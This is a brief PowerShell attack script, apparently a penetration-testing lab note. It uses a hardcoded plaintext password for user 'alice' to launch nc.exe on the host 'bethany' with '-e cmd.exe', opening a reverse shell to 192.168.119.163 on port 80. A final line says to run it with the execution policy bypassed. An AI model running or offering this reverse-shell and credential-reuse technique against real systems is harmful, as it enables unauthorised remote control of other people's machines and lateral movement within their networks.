$secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("alice", $secpasswd)
$computer = "bethany"
[System.Diagnostics.Process]::Start("c:\users\Public\nc.exe","192.168.119.163 80 -e c:\windows\system32\cmd.exe", $mycreds.Username, $mycreds.Password, $computer)


powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File startprocess.ps1 then run that.